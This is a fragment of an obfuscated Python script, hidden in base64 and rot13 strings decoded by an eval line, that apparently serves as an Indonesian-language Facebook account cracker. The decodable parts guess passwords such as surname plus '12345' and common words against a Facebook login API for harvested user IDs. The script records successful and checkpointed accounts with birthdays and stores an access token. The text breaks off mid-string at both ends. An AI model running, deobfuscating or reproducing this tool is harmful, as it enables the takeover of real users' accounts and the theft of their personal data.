l9jcC50eHQiLCAiYSIpDQoJCQkJCQkJCQkJCQkJY2VrLndyaXRlKCJcbklEOiIgK3VzZXIrICIgUHc6IiArcGFzczUrICIgVFRMOiIgK2NbJ2JpcnRoZGF5J10pDQoJCQkJCQkJCQkJCQkJY2VrLmNsb3NlKCkNCgkJCQkJCQkJCQkJCQljZWtwb2ludC5hcHBlbmQodXNlcitwYXNzNSkNCgkJCQkJCQkJCQkJCWVsc2U6DQoJCQkJCQkJCQkJCQkJcGFzczYgPSBjWydsYXN0X25hbWUnXSsnMTIzNDUnDQoJCQkJCQkJCQkJCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcikrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzczYpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQ0KCQkJCQkJCQkJCQkJCXcgPSBqc29uLmxvYWQoZGF0YSkNCgkJCQkJCQkJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiB3Og0KCQkJCQkJCQkJCQkJCQl4ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK3VzZXIrIj9hY2Nlc3NfdG9rZW49Iit3WydhY2Nlc3NfdG9rZW4nXSkNCgkJCQkJCQkJCQkJCQkJeiA9IGpzb24ubG9hZHMoeC50ZXh0KQ0KCQkJCQkJCQkJCQkJCQlwcmludCAnXDAzM1sxOzkybSAtLT4gJyArIHVzZXIgKyAnfCcgKyBwYXNzNiArICd8JyArIGNbJ2JpcnRoZGF5J10NCgkJCQkJCQkJCQkJCQkJb2tzLmFwcGVuZCh1c2VyK3Bhc3M2KQ0KCQkJCQkJCQkJCQkJCWVsc2U6DQoJCQkJCQkJCQkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiB3WydlcnJvcl9tc2cnXToNCgkJCQkJCQkJCQkJCQkJCXByaW50ICdcMDMzWzE7OTNtIC0tPiAnICsgdXNlciArICd8JyArIHBhc3M2ICsgJ3wnICsgY1snYmlydGhkYXknXQ0KCQkJCQkJCQkJCQkJCQkJY2VrID0gb3Blbigib3V0L3N1cGVyX2NwLnR4dCIsICJhIikNCgkJCQkJCQkJCQkJCQkJCWNlay53cml0ZSgiXG5JRDoiICt1c2VyKyAiIFB3OiIgK3Bhc3M2KyAiIFRUTDoiICtjWydiaXJ0aGRheSddKQ0KCQkJCQkJCQkJCQkJCQkJY2VrLmNsb3NlKCkNCgkJCQkJCQkJCQkJCQkJCWNla3BvaW50LmFwcGVuZCh1c2VyK3Bhc3M2KQ0KCQkJCQkJCQkJCQkJCQllbHNlOg0KCQkJCQkJCQkJCQkJCQkJcGFzczcgPSAnU2F5YW5nJw0KCQkJCQkJCQkJCQkJCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcikrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzczcpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQ0KCQkJCQkJCQkJCQkJCQkJdyA9IGpzb24ubG9hZChkYXRhKQ0KCQkJCQkJCQkJCQkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gdzoNCgkJCQkJCQkJCQkJCQkJCQl4ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK3VzZXIrIj9hY2Nlc3NfdG9rZW49Iit3WydhY2Nlc3NfdG9rZW4nXSkNCgkJCQkJCQkJCQkJCQkJCQl6ID0ganNvbi5sb2Fkcyh4LnRleHQpDQoJCQkJCQkJCQkJCQkJCQkJcHJpbnQgJ1wwMzNbMTs5Mm0gLS0+ICcgKyB1c2VyICsgJ3wnICsgcGFzczcgKyAnfCcgKyBjWydiaXJ0aGRheSddDQoJCQkJCQkJCQkJCQkJCQkJb2tzLmFwcGVuZCh1c2VyK3Bhc3M3KQ0KCQkJCQkJCQkJCQkJCQkJZWxzZToNCgkJCQkJCQkJCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gd1snZXJyb3JfbXNnJ106DQoJCQkJCQkJCQkJCQkJCQkJCXByaW50ICdcMDMzWzE7OTNtIC0tPiAnICsgdXNlciArICd8JyArIHBhc3M3ICsgJ3wnICsgY1snYmlydGhkYXknXQ0KCQkJCQkJCQkJCQkJCQkJCQljZWsgPSBvcGVuKCJvdXQvc3VwZXJfY3AudHh0IiwgImEiKQ0KCQkJCQkJCQkJCQkJCQkJCQljZWsud3JpdGUoIlxuSUQ6IiArdXNlcisgIiBQdzoiICtwYXNzNysgIiBUVEw6IiArY1snYmlydGhkYXknXSkNCgkJCQkJCQkJCQkJCQkJCQkJY2VrLmNsb3NlKCkNCgkJCQkJCQkJCQkJCQkJCQkJY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczcpDQoJCQkJCQkJCQkJCQkJCQkJZWxzZToNCgkJCQkJCQkJCQkJCQkJCQkJcGFzczggPSAna29udG9sJw0KCQkJCQkJCQkJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzOCkrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpDQoJCQkJCQkJCQkJCQkJCQkJCXcgPSBqc29uLmxvYWQoZGF0YSkNCgkJCQkJCQkJCQkJCQkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gdzoNCgkJCQkJCQkJCQkJCQkJCQkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrdXNlcisiP2FjY2Vzc190b2tlbj0iK3dbJ2FjY2Vzc190b2tlbiddKQ0KCQkJCQkJCQkJCQkJCQkJCQkJeiA9IGpzb24ubG9hZHMoeC50ZXh0KQ0KCQkJCQkJCQkJCQkJCQkJCQkJcHJpbnQgJ1wwMzNbMTs5Mm0gLS0+ICcgKyB1c2VyICsgJ3wnICsgcGFzczggKyAnfCcgKyBjWydiaXJ0aGRheSddDQoJCQkJCQkJCQkJCQkJCQkJCQlva3MuYXBwZW5kKHVzZXIrcGFzczgpDQoJCQkJCQkJCQkJCQkJCQkJCWVsc2U6DQoJCQkJCQkJCQkJCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gd1snZXJyb3JfbXNnJ106DQoJCQkJCQkJCQkJCQkJCQkJCQkJcHJpbnQgJ1wwMzNbMTs5M20gLS0+ICcgKyB1c2VyICsgJ3wnICsgcGFzczggKyAnfCcgKyBjWydiaXJ0aGRheSddDQoJCQkJCQkJCQkJCQkJCQkJCQkJY2VrID0gb3Blbigib3V0L3N1cGVyX2NwLnR4dCIsICJhIikNCgkJCQkJCQkJCQkJCQkJCQkJCQljZWsud3JpdGUoIlxuSUQ6IiArdXNlcisgIiBQdzoiICtwYXNzOCsgIiBUVEw6IiArY1snYmlydGhkYXknXSkNCgkJCQkJCQkJCQkJCQkJCQkJCQljZWsuY2xvc2UoKQ0KCQkJCQkJCQkJCQkJCQkJCQkJCWNla3BvaW50LmFwcGVuZCh1c2VyK3Bhc3M4KQ0KCQkJCQkJCQkJCQkJCQkJCQkJZWxzZToNCgkJCQkJCQkJCQkJCQkJCQkJCQkJcGFzczkgPSAnYW5qaW5nJw0KCQkJCQkJCQkJCQkJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzOSkrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpDQoJCQkJCQkJCQkJCQkJCQkJCQkJCXcgPSBqc29uLmxvYWQoZGF0YSkNCgkJCQkJCQkJCQkJCQkJCQkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gdzoNCgkJCQkJCQkJCQkJCQkJCQkJCQkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrdXNlcisiP2F'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))/YWNjZXNzX3Rva2VuPScrdG9rZXQpCgkJYSA9IGpzb24ubG9hZHMob3R3LnRleHQpCgkJbmFtYSA9IGFbJ25hbWUnXQoJCXplZGQgPSBvcGVuKCJsb2dpbi50eHQiLCAndycpCgkJemVkZC53cml0ZSh0b2tldCkKCQl6ZWRkLmNsb3NlKCkKCQlqYWxhbiAoJ1wwMzNbMTs5Mm0gVG9rZW4gQmVuZXIg4pyTJykKCQltZW51KCkKCWV4Y2VwdCBLZXlFcnJvcjoKCQlwcmludCAiXDAzM1sxOzkzbSBUb2tlbiBTYWxhaCBDb2sgISIKCQl0aW1lLnNsZWVwKDEpCgkJbWFzdWsoKQoKIyMjIyMjQU1CSUxfVE9LRU4jIyMjIyMKZGVmIEFtYmlsX1Rva2VuKCk6Cglvcy5zeXN0ZW0oImNsZWFyIikKCXByaW50IGxvZ28KCXByaW50IDUwKiAiXDAzM1sxOzk3beKUgCIKCWphbGFuKCJcMDMzWzE7OTdtQW5kYSBBa2FuIERpIEFyYWhrYW4gS2UgQnJvd3NlciBMYWx1IFNlYXJjaCAnZWFhYScgS2VtdWRpYW4gQ29weSBUb2tlbi4iKQoJb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL20uZmFjZWJvb2suY29tL2NvbXBvc2VyL29jZWxvdC9hc3luY19sb2FkZXIvP3B1Ymxpc2hlcj1mZWVkJykKCXRpbWUuc2xlZXAoMykKCW1hc3VrKCkKCiMjIyMjI01FTlUjIyMjIyMjCmRlZiBtZW51KCk6Cglvcy5zeXN0ZW0oJ2NsZWFyJykKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlvcy5zeXN0ZW0oJ2NsZWFyJykKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCW1hc3VrKCkKCXRyeToKCQlvdHcgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0nK3Rva2V0KQoJCWEgPSBqc29uLmxvYWRzKG90dy50ZXh0KQoJCW5hbWEgPSBhWyduYW1lJ10KCQlpZCA9IGFbJ2lkJ10KCWV4Y2VwdCBLZXlFcnJvcjoKCQlvcy5zeXN0ZW0oJ2NsZWFyJykKCQlwcmludCJcMDMzWzE7OTFtIFRva2VuIFdlcyBCb3NvayAhIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCW1hc3VrKCkKCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQlwcmludCIgT3JhIE9ubyBJbnRlcm5ldCIKCQlrZWx1YXIoKQoJb3Muc3lzdGVtKCJjbGVhciIpCglwcmludCBsb2dvCglwcmludCAiXDAzM1sxOzk3bSBfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18iCglwcmludCAiXDAzM1sxOzk3bSBTZWxhbWF0IERhdGFuZ1wwMzNbMTs5N20gIituYW1hCglwcmludCAiXG5cMDMzWzE7OTdtIFVTRVIgSURcMDMzWzE7OTdtICAgICAgICAgLT5cMDMzWzE7OTdtICIraWQKCXByaW50ICJcMDMzWzE7OTdtIFRhbmdnYWwgTGFoaXJcMDMzWzE7OTdtICAgLT5cMDMzWzE7OTdtICIrIGFbJ2JpcnRoZGF5J10KCXByaW50ICJcMDMzWzE7OTdtIF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXyIKCXByaW50ICJcMDMzWzE7OTdtIDEuKSBNdWxhaSBDcmFjayIKCXByaW50ICJcMDMzWzE7OTdtIDIuKSBBbWJpbCBJZCBEZW5nYW4gVXNlcm5hbWUiCglwcmludCAiXDAzM1sxOzk3bSAwLikgTG9nb3V0IFxuIgoJcGlsaWgoKQoKIyMjIyMjUElMSUgjIyMjIyMKZGVmIHBpbGloKCk6Cgl1bmlrZXJzID0gcmF3X2lucHV0KCJcMDMzWzE7OTdtIFJ5bm5uOikgIikKCWlmIHVuaWtlcnMgPT0iIjoKCQlwcmludCAiXDAzM1sxOzk3bSBfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18iCgkJcGlsaWgoKQoJZWxpZiB1bmlrZXJzID09IjEiIG9yIHVuaWtlcnMgPT0iMDEiOgoJCWluZG8oKQoJZWxpZiB1bmlrZXJzID09IjIiIG9yIHVuaWtlcnMgPT0iMDIiOgoJCWlkX2dlbigpCgllbGlmIHVuaWtlcnMgPT0iMCIgb3IgdW5pa2VycyA9PSIwMCI6CgkJb3Muc3lzdGVtKCdjbGVhcicpCgkJamFsYW4oJ01lbmdoYXB1cyB0b2tlbicpCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQlrZWx1YXIoKQoJZWxzZToKCQlwcmludCJcMDMzWzE7OTdtIElzaSBTaW5nIEJlbmVyIENvayAhIgoJCXBpbGloKCkKCgojIyMjIyMjIyMjIENSQUNLIElORE9ORVNJQSAjIyMjIyMjCmRlZiBpbmRvKCk6CglnbG9iYWwgdG9rZXQKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtIFRva2VuIFdlcyBCb3NvayAhIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWtlbHVhcigpCglwcmludCAiXDAzM1sxOzk3bSBfX19fX19fX19fX19fX19